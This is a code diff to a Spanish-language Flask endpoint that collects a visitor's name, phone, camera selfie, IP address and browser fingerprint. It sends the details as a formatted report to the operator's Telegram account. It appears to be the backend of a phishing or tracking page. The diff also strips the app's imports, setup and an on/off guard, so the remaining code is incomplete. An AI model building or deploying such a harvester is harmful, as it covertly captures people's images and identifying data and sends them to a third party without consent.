@@ -1,34 +1,35 @@
-from flask import Flask, request, jsonify, render_template
-from bot import bot, bot_activo
-from config import MI_ID
-from datetime import datetime
-
-app = Flask(__name__)
-
-# ✅ RUTA PRINCIPAL (evita Not Found)
-@app.route('/')
-def home():
-    return render_template("index.html")
-
-# ✅ ENVÍO AL BOT
 @app.route('/enviar', methods=['POST'])
 def enviar():
-    if not bot_activo:
-        return jsonify({"status": "off"}), 403
-
     try:
         nombre = request.form.get('nombre')
         telefono = request.form.get('telefono')
-        foto = request.files['foto']
+        foto = request.files.get('foto')
 
         fecha = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
-        bot.send_photo(
-            MI_ID,
-            foto,
-            caption=f"📸\n{nombre}\n{telefono}\n{request.remote_addr}\n{fecha}"
+        reporte = (
+            "┏━━━━━━━━━━━━━━━━━━━━━━┑\n"
+            "┣► 📸 Selfie tomada\n"
+            f"┣► 👤 Usuario: {nombre}\n"
+            f"┣► 📱 Teléfono: {telefono}\n"
+            f"┣► 🕒 Fecha: {fecha}\n"
+            f"┣► 🌐 IP: {request.remote_addr}\n"
+            f"┣► 📺 Resolución: {request.form.get('resolucion')}\n"
+            f"┣► 🌎 Idioma: {request.form.get('idioma')}\n"
+            f"┣► 📡 Estado: {request.form.get('online')}\n"
+            f"┣► 🌙 Modo oscuro: {request.form.get('dark')}\n"
+            f"┣► ✋ Touch: {request.form.get('touch')}\n"
+            "┣► 🧠 UserAgent:\n"
+            f"{request.form.get('useragent')}\n"
+            "┗━━━━━━━━━━━━━━━━━━━━━━┙"
         )
 
+        if foto:
+            bot.send_photo(MI_ID, foto, caption=reporte)
+        else:
+            bot.send_message(MI_ID, reporte)
+
         return jsonify({"ok": True})
+
     except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        return jsonify({"error": str(e)})
